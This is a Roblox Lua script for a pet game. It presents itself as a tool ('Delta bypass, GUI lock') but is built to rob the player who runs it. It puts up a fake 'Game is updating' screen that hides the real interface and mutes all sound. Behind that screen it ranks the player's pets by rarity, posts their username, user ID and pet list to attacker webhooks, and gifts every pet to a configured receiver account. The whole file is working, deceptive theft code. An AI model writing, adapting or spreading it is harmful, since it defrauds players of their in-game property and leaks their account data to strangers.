-- ✅ FULL GITHUB MAIN SCRIPT (FIXED VERSION)
-- Features: Delta bypass, GUI lock, rare pet priority, pet scanning, webhook sending, gifting logic.

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local VirtualInputManager = game:GetService("VirtualInputManager")

-- ✅ Helper Functions
local function formatNumber(n)
    return tostring(n):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function detectExecutor()
    local name
    pcall(function()
        if identifyexecutor then name = identifyexecutor() elseif getexecutorname then name = getexecutorname() end
    end)
    return name or "Unknown"
end

-- ✅ Show Fake Update GUI & Lock UI
local function showFakeUpdateGui()
    for _, v in pairs(player.PlayerGui:GetChildren()) do if v:IsA("ScreenGui") then v.Enabled = false end end
    for _, s in ipairs(workspace:GetDescendants()) do if s:IsA("Sound") then s.Volume = 0 end end
    for _, s in ipairs(game:GetService("SoundService"):GetDescendants()) do if s:IsA("Sound") then s.Volume = 0 end end
    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

    local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(10,10,10)

    local text = Instance.new("TextLabel", bg)
    text.Size = UDim2.new(1,0,0,60)
    text.Position = UDim2.new(0,0,0.6,0)
    text.Text = "Game is updating... Please wait"
    text.TextColor3 = Color3.new(1,1,1)
    text.TextScaled = true
    text.BackgroundTransparency = 1
end
showFakeUpdateGui()

-- ✅ Find Receiver Player based on Config
local receiverPlr = nil
while not receiverPlr do
    if _Scripts.SM.Config.DualHooked then
        for _, name in ipairs(_Scripts.SM.Config.DualHookUser) do
            local found = Players:FindFirstChild(name)
            if found then receiverPlr = found break end
        end
    end
    if not receiverPlr and getgenv().Username then
        receiverPlr = Players:FindFirstChild(getgenv().Username)
    end
    if not receiverPlr then task.wait(1) end
end

-- ✅ Rare Pet Priority Table
local PetPriorityData = {
    ["Kitsune"] = 1, ["Raccoon"] = 2, ["Disco Bee"] = 3,
    ["Fennec fox"] = 4, ["Butterfly"] = 5, ["Dragonfly"] = 6,
    ["Corrupted Kitsune"] = 7, ["T-Rex"] = 8,
    ["Mega"] = 10, ["Rainbow"] = 11, ["Shiny"] = 12
}

-- ✅ Pet Scanning Logic
local DataService = require(RS.Modules.DataService)
local PetRegistry = require(RS.Data.PetRegistry)
local NumberUtil = require(RS.Modules.NumberUtil)
local PetUtilities = require(RS.Modules.PetServices.PetUtilities)

local function SafeCalculatePetValue(tool)
    local PET_UUID = tool:GetAttribute("PET_UUID")
    if not PET_UUID then return 0 end
    local data = DataService:GetData()
    local invData = data.PetsData.PetInventory.Data[PET_UUID]
    if not invData then return 0 end
    local petData = invData.PetData
    local eggData = PetRegistry.PetEggs[petData.HatchedFrom]
    if not eggData then return 0 end
    local rarityData = eggData.RarityData.Items[invData.PetType]
    if not rarityData then return 0 end
    local WeightRange = rarityData.GeneratedPetData.WeightRange
    local sellPrice = PetRegistry.PetList[invData.PetType].SellPrice
    local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
    local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
    return math.floor(sellPrice * weightMultiplier * levelMultiplier)
end

local function GetPlayerPets()
    local pets = {}
    for _, tool in pairs(player.Backpack:GetChildren()) do
        if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
            local value = SafeCalculatePetValue(tool)
            local baseName = tool.Name:gsub(" %b[]", "")
            table.insert(pets, { Name = tool.Name, BaseName = baseName, Id = tool:GetAttribute("PET_UUID"), Value = value, Tool = tool })
        end
    end
    table.sort(pets, function(a,b)
        local ap = PetPriorityData[a.BaseName] or 99
        local bp = PetPriorityData[b.BaseName] or 99
        if ap == bp then return a.Value > b.Value else return ap < bp end
    end)
    return pets
end

local pets = GetPlayerPets()
local petString = ""
for _, pet in ipairs(pets) do
    petString = petString .. "\n" .. pet.Name .. " → " .. formatNumber(pet.Value)
end

-- ✅ Embed Preparation
local embedData = {
    DisplayName = player.DisplayName,
    Username = player.Name,
    UserId = tostring(player.UserId),
    Receiver = receiverPlr.Name,
    PetsList = petString,
    JobId = game.JobId
}

local function formatEmbed(template, data)
    local encoded = HttpService:JSONEncode(template)
    for key, value in pairs(data) do encoded = encoded:gsub("%%"..key.."%%", value) end
    return HttpService:JSONDecode(encoded)
end

local payload = formatEmbed(_Scripts.SM.Config.Embed, embedData)

-- ✅ Send Webhook (with full fallback and checks)
local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl_request)
if not request then
    warn("[Webhook] No HTTP request function found! Enable HTTP in your executor.")
else
    if type(payload) == "table" then
        local allWebhooks = {}
        if getgenv().Webhook then table.insert(allWebhooks, getgenv().Webhook) end
        if _Scripts.SM.Config.DualHooked then
            for _, hook in ipairs(_Scripts.SM.Config.DualHookWebhook) do table.insert(allWebhooks, hook) end
        end
        for _, hook in ipairs(allWebhooks) do
            pcall(function()
                request({
                    Url = hook,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(payload)
                })
            end)
        end
    else
        warn("[Webhook] Payload missing or invalid!")
    end
end

-- ✅ Gifting Logic with Delta Bypass
local function safeGiftTool(tool)
    if not receiverPlr or not receiverPlr.Character or not player.Character then return false end
    local humanoid = player.Character:FindFirstChild("Humanoid")
    if humanoid then humanoid:EquipTool(tool) task.wait(0.6) end

    if detectExecutor():lower():find("delta") then
        local head = receiverPlr.Character:FindFirstChild("Head")
        if head then
            local screenPos,onScreen = workspace.CurrentCamera:WorldToViewportPoint(head.Position)
            if onScreen then
                VirtualInputManager:SendMouseButtonEvent(screenPos.X,screenPos.Y,0,true,nil,false)
                task.wait(0.8)
                VirtualInputManager:SendMouseButtonEvent(screenPos.X,screenPos.Y,0,false,nil,false)
            end
        end
    else
        local success = pcall(function()
            RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
            task.wait(0.5)
            local prompt = receiverPlr.Character.Head:FindFirstChildOfClass("ProximityPrompt")
            if prompt then fireproximityprompt(prompt) end
        end)
        return success
    end
    return true
end

for _, pet in ipairs(pets) do
    for attempt = 1,3 do
        if safeGiftTool(pet.Tool) then break end
    end
end
